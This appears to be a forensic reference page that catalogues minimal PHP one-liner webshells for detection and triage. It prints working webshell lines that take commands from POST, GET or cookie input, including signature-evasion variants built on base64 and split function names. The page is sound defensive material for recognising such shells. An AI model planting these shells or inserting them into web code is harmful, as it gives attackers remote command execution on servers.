# Minimal Eval / One-Liner Webshells

Minimal webshells reduce the signature footprint of the implant itself: fewer lines means fewer signature-matching opportunities and lower chance of detection by content-scanning tools. They are almost always deployed alongside a larger interactive shell — the minimal shell provides a reliable fallback if the primary shell is removed. When the curator sees a 50-byte PHP file in a `pub/media/` subtree during `observe.file` evidence review, this is usually the pattern.

---

## Pattern catalogue

### Direct eval — POST input

The most basic form. No obfuscation, no auth.

```php
<?php eval($_POST['c']); ?>
```

Variations:
- `$_GET['c']` — command via query string (logged by most web servers)
- `$_REQUEST['c']` — accepts GET or POST
- `$_COOKIE['c']` — cookie delivery (less likely to appear in web server logs)

### eval with base64 decode

Adds one layer of encoding to defeat plaintext command logging.

```php
<?php eval(base64_decode($_POST['c'])); ?>
```

### passthru / system — OS command

Executes OS commands rather than PHP code. Output is returned directly to the HTTP response.

```php
<?php passthru($_POST['c']); ?>
<?php system($_GET['cmd']); ?>
```

`passthru()` passes binary output unmodified; `system()` returns the last line. For command output capture, use `exec()` with output buffering or `shell_exec()`.

### exec / shell_exec

```php
<?php echo shell_exec($_POST['c']); ?>
<?php echo exec($_GET['cmd']); ?>
```

### Short-tag variant

PHP short tags are enabled by default in most modern configurations:

```php
<?= system($_GET['c']); ?>
```

### Error-suppressed with @ operator

```php
<?php @eval($_POST['c']); ?>
```

The `@` suppresses PHP errors that would otherwise appear in the response or error log. Used to avoid leaving error traces.

### Variable function call (detection evasion)

Assigns the function name to a variable to defeat simple function-name grep signatures:

```php
<?php $f = 'sys'.'tem'; $f($_POST['c']); ?>
<?php $f = base64_decode('c3lzdGVt'); $f($_GET['c']); ?>
```

`base64_decode('c3lzdGVt')` decodes to `system`.

### preg_replace /e modifier (PHP < 7.2)

Exploits the deprecated `e` (PREG_REPLACE_EVAL) modifier to execute the replacement string as PHP code:

```php
<?php preg_replace('/.*/e', $_POST['c'], ''); ?>
```

Removed in PHP 7.2. Presence of this pattern indicates legacy PHP target or old shell drop.

---

## Size and stealth profile

Minimal shells are typically 1–5 lines and 50–300 bytes. They frequently appear as:

- A single file with a random or plausible filename (`config.php`, `thumb.php`, `ico.php`)
- Appended to the end of a legitimate PHP file (check for `?>` followed by new PHP content)
- Inside a polyglot container (see `polyshell.md` for the GIF89a variant)

**File-end injection detection:**

```bash
tail -5 <file.php>
# Look for unexpected <?php block after a ?> closing tag
```

---

## Auth patterns

Most minimal shells have no authentication. When auth is present, it is typically one of:

- A hardcoded string comparison: `if ($_POST['p'] === 'secret') { eval(...); }`
- MD5 hash check on a parameter or cookie (see `polyshell.md` for the full hash-gate pattern)

No auth means any adversary who discovers the URL can use the shell. This is common for quickly-dropped persistence implants where stealth, not exclusivity, is the goal.

---

## Triage checklist

The curator's observation batch for a minimal-eval candidate should record:

- [ ] Exact file content and byte length
- [ ] Execution primitive (eval/system/passthru/exec/shell_exec)
- [ ] Input vector ($_POST / $_GET / $_COOKIE / $_REQUEST)
- [ ] Auth gate (compare or hash check before execution)
- [ ] Parent directory contents — minimal shells rarely arrive alone
- [ ] File-end injection check (tail of the file)
- [ ] Web server access log for the file's URL to establish usage timeline

---

## See also

- [polyshell.md](polyshell.md) — full-featured shells that use eval-based dispatch
- [../obfuscation/base64-chains.md](../obfuscation/base64-chains.md) — obfuscated variants
- [../linux-forensics/post-to-shell-correlation.md](../linux-forensics/post-to-shell-correlation.md) — verdict rule per HTTP status against a candidate shell path

<!-- adapted from beacon/skills/webshell-families/minimal-eval.md (2026-04-23) — v2-reconciled -->
